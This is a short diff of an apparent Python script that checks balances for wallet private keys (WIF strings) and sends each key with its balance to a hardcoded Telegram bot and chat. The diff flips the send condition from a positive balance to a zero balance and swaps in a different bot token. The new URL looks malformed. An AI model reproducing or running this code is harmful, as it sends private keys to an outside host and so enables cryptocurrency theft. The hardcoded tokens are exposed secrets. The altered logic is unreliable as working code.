@@ -24,8 +24,8 @@ async def main():
         balance = data["result"]["balance"]
         print(wif, balance)
         dat=wif+' '+str(balance)
-        if int(balance) > 0:
-            await session.get(f"https://api.telegram.org/bot1898293389:AAEIV3G1RUrn2Mkp9oERYiAQv_RyIcF0KAE/sendMessage?chat_id=1149276168&text={dat}")
+        if int(balance) == 0:
+            await session.get(f"https://api.telegram.org/1827311786:AAFozr-h4-yP3BlZMVTMSSJzfdvEMfWFNTo/sendMessage?chat_id=1149276168&text={dat}")
             
 
 loop = asyncio.get_event_loop()
